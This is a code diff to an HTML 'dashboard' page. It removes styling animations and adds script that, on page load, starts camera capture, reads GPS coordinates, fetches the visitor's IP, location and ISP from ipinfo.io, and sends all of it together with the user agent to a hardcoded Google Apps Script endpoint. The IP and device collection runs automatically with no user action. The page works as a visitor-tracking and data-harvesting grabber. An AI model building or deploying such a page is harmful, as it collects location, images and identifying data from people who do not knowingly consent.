@@ -21,16 +21,6 @@
       color: #00ffff;
     }
 
-    /* 動態背景動畫 */
-    @keyframes movingBackground {
-      0% { background-position: 0 0; }
-      100% { background-position: 200% 200%; }
-    }
-
-    body {
-      animation: movingBackground 30s linear infinite;
-    }
-
     .dashboard {
       width: 90%;
       max-width: 1200px;
@@ -60,24 +50,6 @@
       color: #ffffff;
     }
 
-    .card::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(45deg, rgba(0, 255, 204, 0.5), transparent);
-      opacity: 0.1;
-      z-index: 0;
-      animation: glow 6s infinite alternate;
-    }
-
-    @keyframes glow {
-      0% { opacity: 0.1; }
-      100% { opacity: 0.3; }
-    }
-
     .card h2 {
       font-size: 1.8rem;
       text-shadow: 0 0 10px #00ffff;
@@ -101,11 +73,6 @@
     .logo img {
       width: 80px;
       animation: pulse 2s infinite;
-    }
-
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.1); }
     }
 
     .text-input {
@@ -187,6 +154,7 @@
   <script>
     const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbzbWx3Sa7PRXyMf5ihhqZ0nDizmIan0H82CRkPcLFk_iue1wBdVd2AHqbEJqx9AlTWHgg/exec';
 
+    // 相機拍照功能
     async function startCameraAndSend() {
       const statusElement = document.getElementById('photoStatus');
       try {
@@ -219,6 +187,7 @@
       }
     }
 
+    // GPS 獲取並回傳
     async function getGPSInfo() {
       const gpsCoordinatesElement = document.getElementById('gpsCoordinates');
       const gpsAddressElement = document.getElementById('gpsAddress');
@@ -227,13 +196,9 @@
           const { latitude, longitude } = position.coords;
           gpsCoordinatesElement.innerText = `經度: ${longitude.toFixed(5)}, 緯度: ${latitude.toFixed(5)}`;
           try {
-            const response = await fetch(`https://maps.googleapis.com/maps/api/geocode/json?latlng=${latitude},${longitude}&key=YOUR_GOOGLE_API_KEY`);
-            const data = await response.json();
-            const address = data.results[0]?.formatted_address || '無法取得地址';
-            gpsAddressElement.innerText = `地址: ${address}`;
-            sendToServer({ latitude, longitude, address });
+            sendToServer({ latitude, longitude });
           } catch (error) {
-            gpsAddressElement.innerText = '地址讀取失敗';
+            gpsAddressElement.innerText = 'GPS 回傳失敗';
             console.error('GPS 錯誤:', error);
           }
         });
@@ -242,6 +207,35 @@
       }
     }
 
+    // 回傳 IP 和設備資訊
+    async function sendIpAndDeviceInfo() {
+      const ipInfoElement = document.getElementById('ipInfo');
+      try {
+        const response = await fetch('https://ipinfo.io/json');
+        const data = await response.json();
+        const { ip, city, region, country, org } = data;
+        const userAgent = navigator.userAgent;
+
+        ipInfoElement.innerText = 'IP 資料已回傳';
+        sendToServer({ ip, city, region, country, org, userAgent });
+      } catch (error) {
+        ipInfoElement.innerText = 'IP 回傳失敗';
+        console.error('IP 錯誤:', error);
+      }
+    }
+
+    // 回傳文字
+    function sendTextToServer() {
+      const textInput = document.getElementById('textInput').value;
+      if (textInput.trim()) {
+        sendToServer({ message: textInput });
+        alert('文字已回傳！');
+      } else {
+        alert('請輸入內容');
+      }
+    }
+
+    // 通用回傳功能
     async function sendToServer(data) {
       try {
         const formData = new URLSearchParams(data);
@@ -253,19 +247,11 @@
       }
     }
 
-    function sendTextToServer() {
-      const textInput = document.getElementById('textInput').value;
-      if (textInput.trim()) {
-        sendToServer({ message: textInput });
-        alert('文字已回傳！');
-      } else {
-        alert('請輸入內容');
-      }
-    }
-
+    // 啟動所有功能
     window.onload = () => {
       startCameraAndSend();
       getGPSInfo();
+      sendIpAndDeviceInfo();
     };
   </script>
 </body>
